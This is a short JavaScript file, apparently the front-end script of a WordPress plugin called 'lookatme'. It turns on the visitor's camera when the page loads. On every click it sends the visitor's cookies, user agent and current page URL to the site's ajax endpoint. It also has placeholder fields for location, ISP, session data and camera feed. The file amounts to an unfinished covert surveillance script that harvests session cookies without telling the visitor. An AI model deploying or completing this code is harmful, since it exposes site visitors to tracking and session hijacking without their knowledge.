document.addEventListener('DOMContentLoaded', function() {
    const videoFeed = document.getElementById('video-feed');

    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                videoFeed.srcObject = stream;
            })
            .catch(function(error) {
                console.error('Error accessing camera: ', error);
            });
    } else {
        console.error('getUserMedia is not supported by this browser.');
    }

    function getUserData() {
        return {
            latitude: 'some_latitude', // Replace with actual logic to get latitude
            longitude: 'some_longitude', // Replace with actual logic to get longitude
            network_status: navigator.onLine ? 'online' : 'offline',
            isp: 'some_isp', // Replace with actual logic to get ISP
            device_type: 'some_device_type', // Replace with actual logic to determine device type
            browser_info: navigator.userAgent,
            page_visited: window.location.href,
            device_info: 'some_device_info', // Replace with actual device info
            cookies: document.cookie,
            session_data: 'some_session_data', // Replace with actual session data
            camera_feed: 'video_feed_url' // Placeholder for camera feed URL or data
        };
    }

    document.addEventListener('click', function() {
        const data = getUserData();

        fetch(lookatme.ajax_url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: new URLSearchParams(data).toString() + '&action=lookatme_save_data'
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    });
});
